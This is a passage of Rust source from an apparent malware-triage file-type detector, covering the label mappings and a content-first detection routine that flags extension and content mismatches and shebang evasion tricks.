            Self::Json => "json",
            Self::Xml => "xml",
            Self::Yaml => "yaml",
            Self::Plist => "plist",
            Self::Nib => "nib",
            Self::Pbxproj => "pbxproj",
            Self::Cmake => "cmake",
            Self::Svg => "svg",
            Self::Html => "html",
            Self::Jsp => "jsp",
            Self::Asp => "asp",
            Self::Cfml => "cfml",
            Self::Tex => "tex",
            Self::Yara => "yara",
            Self::PostScript => "postscript",
            Self::DosCom => "dos_com",
            Self::Mirc => "mirc",
            Self::IrcII => "ircii",
            Self::Markdown => "markdown",
            Self::PgpSignature => "pgp_signature",
            Self::Text => "text",
            Self::Data => "data",
            Self::Unknown => "unknown",
            // Archive containers and compression.
            Self::Zip => "zip",
            Self::Tar => "tar",
            Self::Cpio => "cpio",
            Self::TarGz => "tar.gz",
            Self::TarBz2 => "tar.bz2",
            Self::TarXz => "tar.xz",
            Self::TarZst => "tar.zst",
            Self::Gz => "gz",
            Self::Bz2 => "bz2",
            Self::Xz => "xz",
            Self::Lzma => "lzma",
            Self::Zst => "zst",
            Self::SevenZ => "7z",
            Self::Rar => "rar",
            Self::Cab => "cab",
            Self::SquashFs => "squashfs",
            Self::Asar => "asar",
            Self::Jar => "jar",
            // Packages.
            Self::Deb => "deb",
            Self::StaticLib => "static-lib",
            Self::Rpm => "rpm",
            Self::Dmg => "dmg",
            Self::Iso => "iso",
            Self::Chm => "chm",
            Self::Crx => "crx",
            Self::Xpi => "xpi",
            Self::Whl => "whl",
            Self::Gem => "gem",
            Self::Npm => "npm",
            Self::Crate => "crate",
            Self::Conda => "conda",
            Self::Egg => "egg",
            Self::Nupkg => "nupkg",
            Self::Ipa => "ipa",
            Self::Vsix => "vsix",
            Self::Xbps => "xbps",
            Self::Snap => "snap",
            Self::Flatpak => "flatpak",
            Self::ApkAndroid => "apk_android",
            Self::ApkAlpine => "apk_alpine",
            Self::PkgMacos => "pkg_macos",
            Self::PkgFreebsd => "pkg_freebsd",
            Self::PkgArch => "pkg_arch",
            Self::PythonSdist => "python_sdist",
            Self::OciImage => "oci_image",
            Self::GentooBinpkg => "gentoo_binpkg",
            // Documents / media.
            Self::Rtf => "rtf",
            Self::OleDoc => "ole_doc",
            Self::Msi => "msi",
            Self::Ooxml => "ooxml",
            Self::Lnk => "lnk",
            Self::Jpeg => "jpeg",
            Self::Png => "png",
            Self::Font => "font",
            Self::Wav => "wav",
            Self::Aiff => "aiff",
            Self::Mp3 => "mp3",
            Self::Mp4 => "mp4",
            Self::Ico => "ico",
            Self::Gif => "gif",
            Self::Bmp => "bmp",
            Self::Webp => "webp",
            Self::Pdf => "pdf",
            Self::Pickle => "pickle",
            Self::Odf => "odf",
        }
    }

    /// Parse a [`FileType`] from its canonical [`label`](FileType::label).
    /// Returns `None` for any string that is not a label — the exact inverse
    /// of `label`, verified exhaustively by the `label_round_trips` test.
    #[must_use]
    pub fn from_label(label: &str) -> Option<Self> {
        Some(match label {
            "macho" => Self::MachO,
            "elf" => Self::Elf,
            "pe" => Self::Pe,
            "java_class" => Self::JavaClass,
            "python_bytecode" => Self::PythonBytecode,
            "beam" => Self::Beam,
            "wasm" => Self::Wasm,
            "dex" => Self::Dex,
            "shell" => Self::Shell,
            "batch" => Self::Batch,
            "jcl" => Self::Jcl,
            "vbs" => Self::Vbs,
            "python" => Self::Python,
            "javascript" => Self::JavaScript,
            "typescript" => Self::TypeScript,
            "go" => Self::Go,
            "rust" => Self::Rust,
            "java" => Self::Java,
            "ruby" => Self::Ruby,
            "php" => Self::Php,
            "perl" => Self::Perl,
            "lua" => Self::Lua,
            "csharp" => Self::CSharp,
            "powershell" => Self::PowerShell,
            "swift" => Self::Swift,
            "objective_c" => Self::ObjectiveC,
            "groovy" => Self::Groovy,
            "scala" => Self::Scala,
            "kotlin" => Self::Kotlin,
            "zig" => Self::Zig,
            "elixir" => Self::Elixir,
            "clojure" => Self::Clojure,
            "c" => Self::C,
            "applescript" => Self::AppleScript,
            "makefile" => Self::Makefile,
            "dockerfile" => Self::Dockerfile,
            "package.json" => Self::PackageJson,
            "package-lock.json" => Self::PackageLockJson,
            "composer.json" => Self::ComposerJson,
            "composer.lock" => Self::ComposerLock,
            "cargo.toml" => Self::CargoToml,
            "cargo.lock" => Self::CargoLock,
            "pyproject.toml" => Self::PyProjectToml,
            "requirements.txt" => Self::RequirementsTxt,
            "poetry.lock" => Self::PoetryLock,
            "pipfile.lock" => Self::PipfileLock,
            "gemfile.lock" => Self::GemfileLock,
            "yarn.lock" => Self::YarnLock,
            "pnpm-lock.yaml" => Self::PnpmLock,
            "go.mod" => Self::GoMod,
            "go.sum" => Self::GoSum,
            "gyp" => Self::Gyp,
            "github_actions" => Self::GithubActions,
            "systemd_service" => Self::SystemdService,
            "desktop_entry" => Self::DesktopEntry,
            "pkg_info" => Self::PkgInfo,
            "src_info" => Self::SrcInfo,
            "vsix_manifest" => Self::VsixManifest,
            "chrome_manifest" => Self::ChromeManifest,
            "registry" => Self::Registry,
            "json" => Self::Json,
            "xml" => Self::Xml,
            "yaml" => Self::Yaml,
            "plist" => Self::Plist,
            "nib" => Self::Nib,
            "pbxproj" => Self::Pbxproj,
            "cmake" => Self::Cmake,
            "svg" => Self::Svg,
            "html" => Self::Html,
            "jsp" => Self::Jsp,
            "asp" => Self::Asp,
            "cfml" => Self::Cfml,
            "tex" => Self::Tex,
            "yara" => Self::Yara,
            "postscript" => Self::PostScript,
            "dos_com" => Self::DosCom,
            "mirc" => Self::Mirc,
            "ircii" => Self::IrcII,
            "markdown" => Self::Markdown,
            "pgp_signature" => Self::PgpSignature,
            "text" => Self::Text,
            "data" => Self::Data,
            "unknown" => Self::Unknown,
            "zip" => Self::Zip,
            "tar" => Self::Tar,
            "cpio" => Self::Cpio,
            "tar.gz" => Self::TarGz,
            "tar.bz2" => Self::TarBz2,
            "tar.xz" => Self::TarXz,
            "tar.zst" => Self::TarZst,
            "gz" => Self::Gz,
            "bz2" => Self::Bz2,
            "xz" => Self::Xz,
            "lzma" => Self::Lzma,
            "zst" => Self::Zst,
            "7z" => Self::SevenZ,
            "rar" => Self::Rar,
            "cab" => Self::Cab,
            "squashfs" => Self::SquashFs,
            "asar" => Self::Asar,
            "jar" => Self::Jar,
            "deb" => Self::Deb,
            "static-lib" => Self::StaticLib,
            "rpm" => Self::Rpm,
            "dmg" => Self::Dmg,
            "iso" => Self::Iso,
            "chm" => Self::Chm,
            "crx" => Self::Crx,
            "xpi" => Self::Xpi,
            "whl" => Self::Whl,
            "gem" => Self::Gem,
            "npm" => Self::Npm,
            "crate" => Self::Crate,
            "conda" => Self::Conda,
            "egg" => Self::Egg,
            "nupkg" => Self::Nupkg,
            "ipa" => Self::Ipa,
            "vsix" => Self::Vsix,
            "xbps" => Self::Xbps,
            "snap" => Self::Snap,
            "flatpak" => Self::Flatpak,
            "apk_android" => Self::ApkAndroid,
            "apk_alpine" => Self::ApkAlpine,
            "pkg_macos" => Self::PkgMacos,
            "pkg_freebsd" => Self::PkgFreebsd,
            "pkg_arch" => Self::PkgArch,
            "python_sdist" => Self::PythonSdist,
            "oci_image" => Self::OciImage,
            "gentoo_binpkg" => Self::GentooBinpkg,
            "rtf" => Self::Rtf,
            "ole_doc" => Self::OleDoc,
            "msi" => Self::Msi,
            "ooxml" => Self::Ooxml,
            "lnk" => Self::Lnk,
            "jpeg" => Self::Jpeg,
            "png" => Self::Png,
            "font" => Self::Font,
            "wav" => Self::Wav,
            "aiff" => Self::Aiff,
            "mp3" => Self::Mp3,
            "mp4" => Self::Mp4,
            "ico" => Self::Ico,
            "gif" => Self::Gif,
            "bmp" => Self::Bmp,
            "webp" => Self::Webp,
            "pdf" => Self::Pdf,
            "pickle" => Self::Pickle,
            "odf" => Self::Odf,
            _ => return None,
        })
    }
}

impl std::fmt::Display for FileType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.label())
    }
}

impl serde::Serialize for FileType {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        serializer.serialize_str(self.label())
    }
}

impl<'de> serde::Deserialize<'de> for FileType {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        let label = <std::borrow::Cow<'de, str>>::deserialize(deserializer)?;
        Self::from_label(&label)
            .ok_or_else(|| serde::de::Error::custom(format!("unknown FileType label: {label:?}")))
    }
}

/// How the file type was identified.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[non_exhaustive]
#[derive(serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DetectionSource {
    /// Magic bytes at the start of the file.
    Magic,
    /// Shebang line (`#!...`).
    Shebang,
    /// Well-known filename (e.g. `package.json`, `action.yml`).
    Filename,
    /// File extension mapping.
    Extension,
    /// Lightweight content heuristics (pattern matching).
    Heuristic,
    /// Extension overrode a shebang juke (e.g. `.js` file with `#!/bin/bash`).
    /// `extension_type()` returns the type the shebang claimed.
    ExtensionOverridesShebang,
    /// Type asserted by the caller via [`FileId::forced`] /
    /// [`crate::open_as`], bypassing detection. Used when the language is
    /// already known from context the bytes alone don't carry — e.g. the
    /// inner source of a `python3 -c "<code>"` payload, whose extracted
    /// body has no shebang, extension, or magic to detect.
    Forced,
}

/// What the file extension implies about the content.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ExtensionMatch {
    /// Extension maps to the same type as content detection, or no extension present.
    Consistent,
    /// Extension maps to a different known type.
    Different(FileType),
    /// Extension is present but not recognized by fileid.
    Unknown,
}

/// Result of file format identification.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Detection {
    /// The identified file type.
    pub file_type: FileType,
    /// How we identified it.
    pub source: DetectionSource,
    /// Relationship between detected type and file extension.
    ext_match: ExtensionMatch,
}

impl Detection {
    /// True when content-based detection identified a different type than
    /// the file's extension implies.
    ///
    /// This covers two cases:
    /// - Extension maps to a *different* known type than content detected
    /// - Extension is present but *unknown* to fileid (e.g. `.woff2` containing PE)
    ///
    /// Returns false when:
    /// - Detection was extension/filename-based (no conflict possible)
    /// - The file has no extension
    /// - The extension maps to the same type as content detection
    #[must_use]
    pub fn extension_mismatch(&self) -> bool {
        matches!(
            self.source,
            DetectionSource::Magic
                | DetectionSource::Shebang
                | DetectionSource::Heuristic
                | DetectionSource::ExtensionOverridesShebang
        ) && !matches!(self.ext_match, ExtensionMatch::Consistent)
    }

    /// True when content was identified as a script language but the
    /// shebang juked toward a different scripting language. Callers can
    /// use this to label the mismatch as "shebang juke" rather than the
    /// generic extension/content disagreement.
    #[must_use]
    pub fn is_shebang_juke(&self) -> bool {
        self.source == DetectionSource::ExtensionOverridesShebang
    }

    /// The file type implied by the extension, if any.
    /// `None` when the extension is absent, unrecognized, or matches the detected type.
    #[must_use]
    pub fn extension_type(&self) -> Option<FileType> {
        match self.ext_match {
            ExtensionMatch::Different(ft) => Some(ft),
            _ => None,
        }
    }
}

/// True when a shebang→extension mismatch should be treated as evasion.
///
/// Specifically: a shell shebang on a file whose extension claims a different
/// scripting language. We treat the extension as authoritative in this case.
/// We deliberately do NOT generalise to all script-vs-script mismatches —
/// `#!/usr/bin/env python3` on a `.py` file with no other indicators is fine.
fn is_shebang_juke(detected: FileType, ext_type: FileType) -> bool {
    matches!(detected, FileType::Shell)
        && matches!(
            ext_type,
            FileType::JavaScript
                | FileType::TypeScript
                | FileType::Python
                | FileType::Ruby
                | FileType::Php
                | FileType::Perl
                | FileType::Lua
        )
}

fn allows_heuristic_extension_override(file_type: FileType) -> bool {
    matches!(
        file_type,
        // A media extension is a container claim, not a language claim, and
        // the whole point of naming a payload `fa-solid-500.woff2` or
        // `favicon.ico` is that nothing looks inside. When the sniffer
        // recognises real source in there, the source wins and
        // `extension_mismatch` records the lie.
        FileType::Font
            | FileType::Wav
            | FileType::Aiff
            | FileType::Mp3
            | FileType::Mp4
            | FileType::Ico
            | FileType::Gif
            | FileType::Bmp
            | FileType::Webp
            | FileType::Zip
            | FileType::Jar
            | FileType::Xpi
            | FileType::Whl
            | FileType::Ooxml
            | FileType::Odf
            | FileType::Cab
            | FileType::Chm
            | FileType::Rar
            | FileType::SevenZ
            // `.a`/`.lib` claim an ar archive, and a real one starts with
            // `!<arch>\n` -- magic that stage 1 always catches. So an `.a`
            // that reaches this fallback is never a static library; the
            // extension is the only thing saying otherwise. vxheaven names
            // its samples `Virus.DOS.Jerusalem.1347.a`, `Exploit.HTML.
            // HTHelp.a`, `Trojan.BAT.DelAll.a` -- a variant letter, not an
            // extension -- and all twenty in the triage corpus were typed
            // `static-lib` and analysed as opaque binaries. Letting the
            // sniffer look inside recovers the HTML, batch and registry ones
            // as what they are.
            | FileType::StaticLib
            // `.m` is Objective-C, and also where Perl, ASP, and mIRC samples
            // get dumped. Real Objective-C that the scorer does not recognise
            // stays Objective-C via the extension fallback. A body that is
            // clearly another language should be that language.
            | FileType::ObjectiveC
            // `.bb` is Babashka, and also a vxheaven variant letter
            // (`Backdoor.PHP.Agent.bb`). A body that is clearly another
            // language should be that language; a Babashka script the scorer
            // does not recognise stays Clojure via the extension.
            | FileType::Clojure
    )
}

/// `.txt` / `.text` claim prose. They are listed as data formats so a note
/// that mentions a keyword stays text, but a file whose body is clearly a
/// language (`Php_Backdoor.txt`) should be that language. Other extensions
/// that map to `Text` (OCaml `.ml`, CSS, SQL) stay on the extension.
/// Extensions that are a filename habit rather than a type claim. A mark may
/// replace them. A real `.java` or `.py` may not.
fn mark_replaces(file_type: FileType) -> bool {
    matches!(
        file_type,
        FileType::Text
            | FileType::Html
            // An `.a` that reaches here has no `!<arch>` magic, so it claims
            // nothing a mark could contradict.
            | FileType::StaticLib
            | FileType::ObjectiveC
            | FileType::Lua
            | FileType::Clojure
            | FileType::JavaScript
            | FileType::Python
            | FileType::Vbs
    )
}

/// A leading tag. Used when the extension is a variant letter (`.sc`, `.ex`)
/// rather than a claim that the body is that language.
fn leading_markup(data: &[u8]) -> bool {
    let n = data.len().min(32);
    let rest = data[..n].trim_ascii_start();
    let starts = |prefix: &[u8]| {
        rest.len() >= prefix.len() && rest[..prefix.len()].eq_ignore_ascii_case(prefix)
    };
    starts(b"<script")
        || starts(b"<html")
        || starts(b"<!doctype")
        || starts(b"<body")
        || starts(b"<iframe")
}

/// `.sc` markup. Ammonite worksheets keep the extension; a leading tag does not.
fn sc_name_is_markup(path: &Path, data: &[u8]) -> bool {
    let Some(ext) = path.extension().and_then(|e| e.to_str()) else {
        return false;
    };
    ext.eq_ignore_ascii_case("sc") && leading_markup(data)
}

/// `.ex` is Elixir and a vxheaven variant letter. `.exs` stays Elixir.
/// A leading mark of another format wins; `defmodule` does not.
fn ex_variant_override(path: &Path, data: &[u8]) -> Option<FileType> {
    let ext = path.extension().and_then(|e| e.to_str())?;
    if !ext.eq_ignore_ascii_case("ex") {
        return None;
    }
    if let Some(marked) = heuristics::unmistakable(data) {
        return Some(marked);
    }
    if leading_markup(data) || utf16le_markup(data) {
        return Some(FileType::Html);
    }
    if leading_batch(data) {
        return Some(FileType::Batch);
    }
    None
}

fn leading_batch(data: &[u8]) -> bool {
    let n = data.len().min(80);
    let rest = data[..n].trim_ascii_start();
    if rest.len() < 5 || !rest[..5].eq_ignore_ascii_case(b"@echo") {
        return false;
    }
    let line_end = rest
        .iter()
        .position(|b| *b == b'\n' || *b == b'\r')
        .unwrap_or(rest.len());
    rest[..line_end]
        .windows(3)
        .any(|w| w.eq_ignore_ascii_case(b"off"))
}

fn utf16le_markup(data: &[u8]) -> bool {
    let Some(rest) = data.strip_prefix(b"\xff\xfe") else {
        return false;
    };
    let mut text = [0u8; 16];
    let mut n = 0;
    let mut i = 0;
    while i + 1 < rest.len() && n < text.len() {
        if rest[i + 1] != 0 {
            return false;
        }
        text[n] = rest[i];
        n += 1;
        i += 2;
    }
    leading_markup(&text[..n])
}

fn prose_extension_may_be_source(path: &Path) -> bool {
    let Some(ext) = path.extension().and_then(|e| e.to_str()) else {
        return false;
    };
    // `.txt` and `.md` name a document. The body is still scored first; the
    // extension is only the fallback when that score finds no language.
    // `.rmd` / `.qmd` stay markdown: those formats are prose with code chunks.
    ext.eq_ignore_ascii_case("txt")
        || ext.eq_ignore_ascii_case("text")
        || ext.eq_ignore_ascii_case("md")
        || ext.eq_ignore_ascii_case("markdown")
        || ext.eq_ignore_ascii_case("rst")
        || ext.eq_ignore_ascii_case("adoc")
        || ext.eq_ignore_ascii_case("csv")
        || ext.eq_ignore_ascii_case("tsv")
        || ext.eq_ignore_ascii_case("log")
}

/// True when a path's trailing dot-segment is a real extension rather than the
/// tail of a version number.
///
/// `Path::extension` splits on the last dot, so `keyvault-keys@4.8.0` reports
/// an extension of `"0"`, `react-redux@7.1.25` reports `"25"`, and `python3.11`
/// reports `"11"`. Registry artifacts are routinely named this way — npm, crates
/// and gem tarballs are stored as `<name>@<semver>` with no suffix at all.
///
/// Treating those digits as an unrecognized extension made every one of them an
/// extension/content mismatch: content detection identifies the gzip tar, the
/// "extension" matches nothing, and the file is reported as `archive_as_unknown`
/// — a masquerade signal on an ordinary package. A run of digits claims nothing
/// about a file's format, so it is not something content can disagree with.
///
/// The `.so.1.1` case has its own handling in `ext::has_versioned_so_suffix`,
/// which assigns the type; this only decides whether an extension was named.
fn has_named_extension(path: &Path) -> bool {
    path.extension()
        .and_then(|e| e.to_str())
        .is_some_and(|e| !e.is_empty() && !e.bytes().all(|b| b.is_ascii_digit()))
}

/// True for the specific formats that are *written in* YAML. Their `.yml` /
/// `.yaml` extension resolves to the generic [`FileType::Yaml`], so content
/// detection refining it to one of these is agreement about the same file, not
/// a masquerade — the relationship `.json` already has with `package.json`.
const fn is_yaml_dialect(ft: FileType) -> bool {
    matches!(ft, FileType::GithubActions | FileType::PnpmLock)
}

/// True when an extension/content disagreement is a known benign format
/// convention rather than an evasion signal. Mirrors the carve-outs cleave
/// previously applied before emitting `metadata/file-extension-mismatch`.
fn is_benign_extension_mismatch(path: &Path, data: &[u8], det: Detection) -> bool {
    // macOS AppleDouble sidecars (`._name`) carry resource-fork bytes whose
    // type intentionally differs from the extension — convention, not evasion.
    if path
        .file_name()
        .and_then(|n| n.to_str())
        .is_some_and(|n| n.starts_with("._"))
    {
        return true;
    }
    let Some(ext_type) = det.extension_type() else {
        return false;
    };
    let content = det.file_type;
    let name_ends_ci = |suffix: &str| {
        path.file_name().and_then(|n| n.to_str()).is_some_and(|n| {
            n.len() >= suffix.len() && n[n.len() - suffix.len()..].eq_ignore_ascii_case(suffix)
        })
    };
    // Android/Alpine APK: `.apk` (extension maps to Zip) resolved by container
    // magic to the ecosystem-specific type. Both are legitimate `.apk`s — the
    // disambiguation is the point, not an evasion signal.
    if name_ends_ci(".apk")
        && ext_type == FileType::Zip
        && matches!(content, FileType::ApkAndroid | FileType::ApkAlpine)
    {
        return true;
    }
    // Content detection refined a generic-archive extension to a specific
    // package ecosystem (npm `.tgz`, Arch/FreeBSD `.pkg*`). The extension's
    // generic archive type and the content's specific archive type agree on
    // being an archive — a benign refinement, not a masquerade.
    if matches!(
        content,
        FileType::Npm
            | FileType::PkgFreebsd
            | FileType::PkgArch
            | FileType::PythonSdist
            | FileType::OciImage
            | FileType::Xbps
            | FileType::GentooBinpkg
    ) && ext_type.is_archive()
    {
        return true;
    }
    // XHTML served with a `.html` extension but parsed as XML.
    if ext_type == FileType::Html && content == FileType::Xml {
        let n = data.len().min(4096);
        let prefix = String::from_utf8_lossy(&data[..n]).to_ascii_lowercase();
        return prefix.contains("<!doctype html") || prefix.contains("<html");
    }
    false
}

/// Detect file type from content + path. Content is trusted first, extension as fallback.
///
/// Returns `None` if the file format cannot be identified.
#[must_use]
pub fn detect(path: &Path, data: &[u8]) -> Option<Detection> {
    // Stage 1: Content-based detection (magic bytes, shebangs)
    if let Some((file_type, source)) = magic::detect_from_content(path, data) {
        let ext_ft = ext::detect_from_path(path);

        // A `.jsp` / `.asp` / `.cfm` page often opens with an HTML prologue.
        // That prologue is magic for HTML, but the extension is what the
        // server executes. Prefer it; the prologue is not a different type.
        if file_type == FileType::Html {
            if let Some(ext_type) = ext_ft {
                if matches!(ext_type, FileType::Jsp | FileType::Asp | FileType::Cfml) {
                    return Some(Detection {
                        file_type: ext_type,
                        source: DetectionSource::Extension,
                        ext_match: ExtensionMatch::Consistent,
                    });
                }
            }
            // A saved page can open with a doctype and still be the server
            // page a few lines later. The mark replaces that HTML prologue
            // the same way it replaces a `.txt` name.
            if let Some(marked) = heuristics::unmistakable(data) {
                if matches!(marked, FileType::Jsp | FileType::Asp | FileType::Cfml) {
                    let ext_match = match ext_ft {
                        Some(e) if e != marked => ExtensionMatch::Different(e),
                        None if has_named_extension(path) => ExtensionMatch::Unknown,
                        Some(_) | None => ExtensionMatch::Consistent,
                    };
                    return Some(Detection {
                        file_type: marked,
                        source: DetectionSource::Heuristic,
                        ext_match,
                    });
                }
            }
        }

        // Shebang-juke override: when the shebang claims a different scripting
        // language than the file's extension implies, and both languages are
        // plausible (script ↔ script), prefer the extension. The shebang is
        // a 12-byte string an attacker can prepend to any file; the extension
        // is what the user/loader treats the file as. JavaScript ".js" carrying
        // a "#!/bin/bash" shebang is a textbook static-analysis evasion seen
        // in the npm xmlrpc supply-chain compromise (2024) and similar.
        if source == DetectionSource::Shebang {
            if let Some(ext_type) = ext_ft {
                if ext_type != file_type && is_shebang_juke(file_type, ext_type) {
                    // Distinct source variant lets callers tell the juke case
                    // apart from a normal shebang detection. ext_match stores
                    // the type the shebang claimed.
                    return Some(Detection {
                        file_type: ext_type,
                        source: DetectionSource::ExtensionOverridesShebang,
                        ext_match: ExtensionMatch::Different(file_type),
                    });
                }
            }
        }

        // Node, Deno and Bun all run TypeScript, so a JavaScript-runtime
        // shebang on a `.ts` file names the runtime, not another language.
        let file_type = if source == DetectionSource::Shebang
            && file_type == FileType::JavaScript
            && ext_ft == Some(FileType::TypeScript)
        {
            FileType::TypeScript
        } else {
            file_type
        };

        let ext_match = match ext_ft {
            Some(FileType::Yaml) if is_yaml_dialect(file_type) => ExtensionMatch::Consistent,
            Some(e) if e != file_type => ExtensionMatch::Different(e),
            None if has_named_extension(path) => ExtensionMatch::Unknown,
            Some(_) | None => ExtensionMatch::Consistent,
        };
        return Some(Detection {
            file_type,
            source,
            ext_match,
        });
    }

    // Stage 2: Well-known filename match (LICENSE, package.json, Makefile,
    // …). These are explicit names users type — no aliasing or content
    // ambiguity, so they outrank both heuristics and extension fallback.
    if ext::is_filename_match(path) {
        if let Some(file_type) = ext::detect_from_path(path) {
            return Some(Detection {
                file_type,
                source: DetectionSource::Filename,
                ext_match: ExtensionMatch::Consistent,
            });
        }
    }

    let ext_ft = ext::detect_from_path(path);
    let heuristic_may_override_ext = ext_ft.is_none_or(allows_heuristic_extension_override);

    // `.sc` is an Ammonite worksheet and also a vxheaven variant letter.
    // A worksheet starts with Scala. A file whose first token is markup is
    // the page, and `.scala` is left alone.
    if sc_name_is_markup(path, data) {
        return Some(Detection {
            file_type: FileType::Html,
            source: DetectionSource::Heuristic,
            ext_match: ExtensionMatch::Different(FileType::Scala),
        });
    }
    if let Some(kind) = ex_variant_override(path, data) {
        return Some(Detection {
            file_type: kind,
            source: DetectionSource::Heuristic,
            ext_match: ExtensionMatch::Different(FileType::Elixir),
        });
    }

    // One unmistakable mark beats the language scorer. It only replaces a
    // weak or absent extension (`.txt`, `.m`, `.lua`, a page typed HTML
    // because of a prologue). A `.java` or `.py` name stays what it says.
    if let Some(marked) = heuristics::unmistakable(data) {
        if ext_ft.is_none_or(|ext| ext == marked || mark_replaces(ext)) {
            let ext_match = match ext_ft {
                Some(e) if e != marked => ExtensionMatch::Different(e),
                None if has_named_extension(path) => ExtensionMatch::Unknown,
                Some(_) | None => ExtensionMatch::Consistent,
            };
            return Some(Detection {
                file_type: marked,
                source: DetectionSource::Heuristic,
                ext_match,
            });
        }
    }

    // Stage 3: Content heuristics for unknown extensions and extension-claimed
    // containers/polyglots. Ordinary source extensions stay authoritative here:
    // language keyword scoring is too weak to override `.go`, `.js`, `.swift`,
    // etc. Container extensions are different because a non-magic `.zip` body
    // may be a script payload wearing an archive name.
    if (heuristic_may_override_ext && !ext::is_data_format(path))
        || prose_extension_may_be_source(path)
    {
        if let Some(file_type) = heuristics::detect_from_content(data) {
            let ext_match = match ext_ft {
                Some(e) if e != file_type => ExtensionMatch::Different(e),
                None if has_named_extension(path) => ExtensionMatch::Unknown,
                Some(_) | None => ExtensionMatch::Consistent,
            };
            return Some(Detection {
                file_type,
                source: DetectionSource::Heuristic,
                ext_match,
            });
        }
    }

    // Object code with a source extension is not that language. DOS COM samples
    // named `Burger.m` or `Trivial.45.t` used to inherit Objective-C or Perl
    // from the suffix. UTF-16 source is excluded inside `binary_not_source`.
    if let Some(ext) = ext_ft.filter(|ft| claims_source(*ft)) {
        if heuristics::binary_not_source(data) {
            return Some(Detection {
                file_type: binary_body_type(data),
                source: DetectionSource::Heuristic,
                ext_match: ExtensionMatch::Different(ext),
            });
        }
        // Text the extension misnames: a page, or another language the scorer
        // is sure of while finding nothing of the claimed one.
        if let Some(found) = heuristics::contradicts_extension(ext, data) {
            return Some(Detection {
                file_type: found,
                source: DetectionSource::Heuristic,
                ext_match: ExtensionMatch::Different(ext),
            });
        }
    }

    // A unit file and a desktop entry are text. The `.Service` on
    // `Virus.Boot.Stoned.Service` is a variant letter on a boot sector,
    // and a binary `.desktop` is the same kind of misname.
    if let Some(ext) =
        ext_ft.filter(|ft| matches!(ft, FileType::SystemdService | FileType::DesktopEntry))
    {
        if heuristics::binary_not_source(data) {
            return Some(Detection {
                file_type: FileType::Data,
                source: DetectionSource::Heuristic,
                ext_match: ExtensionMatch::Different(ext),
            });
        }
    }

    // Stage 4: Extension fallback (used when no content-first detector resolved
    // and the filename was not well-known).
    if let Some(file_type) = ext_ft {
        // A format defined by its magic, whose magic stage 1 did not find. The
        // name is the only thing claiming it, and the bytes have already said
        // no: vxheaven's `.a` variant letter made 200+ DOS programs, boot
        // sectors and batch files "static libraries", and an HTML page named
        // `.ko` became an ELF module.
        if !data.is_empty() && is_magic_defined(file_type) {
            return Some(Detection {
                file_type: unclaimed_body_type(data),
                source: DetectionSource::Heuristic,
                ext_match: ExtensionMatch::Different(file_type),
            });
        }
        // `.m` is where every misnamed sample lands. Objective-C carries
        // directives the scorer knows (`#import`, `@interface`) or at least C
        // statement structure; text with neither is not Objective-C because
        // of its last letter.
        if file_type == FileType::ObjectiveC
            && !data.is_empty()
            && !heuristics::has_language_evidence(file_type, data)
            && !heuristics::looks_like_c_family(data)
            && !heuristics::is_utf16_text(data)
        {
            return Some(Detection {
                file_type: unclaimed_body_type(data),
                source: DetectionSource::Heuristic,
                ext_match: ExtensionMatch::Different(file_type),
            });
        }
        // SVG magic is decided in stage 1. Reaching this fallback means the
        // body has no `<svg>` root, so the name is not a reason to call it an
        // image. `logo.svg` containing a script is the script.
        if file_type == FileType::Svg {
            return Some(Detection {
                file_type: unclaimed_body_type(data),
                source: DetectionSource::Heuristic,
                ext_match: ExtensionMatch::Different(FileType::Svg),
            });
        }
        // HTML extension requires content validation. Use the extended window:
        // reaching here means the filename claims HTML, and that claim is what
        // licenses looking past a short prefix. Otherwise front-padding the file
        // downgrades it to Unknown, which matches no trait at all.
        if file_type == FileType::Html && !heuristics::looks_like_html(data) {
            return None;
        }
        // `.bin`/`.dat`/`.raw` say nothing about the content, and DOS samples
        // routinely carry them. A COM-shaped body under a generic data name is
        // the program, not opaque data.
        if file_type == FileType::Data && heuristics::looks_like_unnamed_dos_com(data) {
            return Some(Detection {
                file_type: FileType::DosCom,
                source: DetectionSource::Heuristic,
                ext_match: ExtensionMatch::Different(FileType::Data),
            });
        }
        return Some(Detection {
            file_type,
            source: DetectionSource::Extension,
            ext_match: ExtensionMatch::Consistent,
        });
    }

    // No extension and nothing above recognised it. Corpora name samples by
    // hash, so a DOS COM there has no `.com` to go on; without this it was
    // Unknown, which no trait walks, and every DOS rule was blind to it.
    if heuristics::looks_like_unnamed_dos_com(data) {
        return Some(Detection {
            file_type: FileType::DosCom,
            source: DetectionSource::Heuristic,
            ext_match: if has_named_extension(path) {
                ExtensionMatch::Unknown
            } else {
                ExtensionMatch::Consistent
            },
        });
    }

    None
}

/// Types whose extension names a language or script, so a body that is not
/// text, or is plainly another language, contradicts it.
fn claims_source(ft: FileType) -> bool {
    ft.is_source_code()
        || matches!(
            ft,
            FileType::Clojure | FileType::Batch | FileType::Vbs | FileType::AppleScript
        )
}

/// Formats that start with magic stage 1 always recognises. Reaching the
/// extension fallback means the magic is absent, so the name is wrong.
fn is_magic_defined(ft: FileType) -> bool {
    matches!(
        ft,
        FileType::StaticLib
            | FileType::Elf
            | FileType::Pe
            | FileType::MachO
            | FileType::JavaClass
            | FileType::Dex
            | FileType::Wasm
    )
}

/// Object code with no header: a DOS COM program when it calls DOS, otherwise
/// opaque data.
fn binary_body_type(data: &[u8]) -> FileType {
    if heuristics::looks_like_dos_com(data) {
        FileType::DosCom
    } else {
        FileType::Data
    }
}

/// What a body is once its extension has been ruled out: binary, a page, a
/// language the scorer recognises, or plain text. A COM program shorter than
/// the binary judgement's window still cannot pass as text: `CD 21` is never
/// valid UTF-8.
fn unclaimed_body_type(data: &[u8]) -> FileType {
    if heuristics::binary_not_source(data)
        || (heuristics::looks_like_dos_com(data) && std::str::from_utf8(data).is_err())
    {
        binary_body_type(data)
    } else if let Some(marked) = heuristics::unmistakable(data) {
        marked
    } else if heuristics::looks_like_html(data) {
        FileType::Html
    } else {
        heuristics::detect_from_content(data).unwrap_or(FileType::Text)
    }
}

/// Detect file type from content alone (magic bytes + shebangs only).
///
/// Does not consider file extensions or heuristics.
#[must_use]
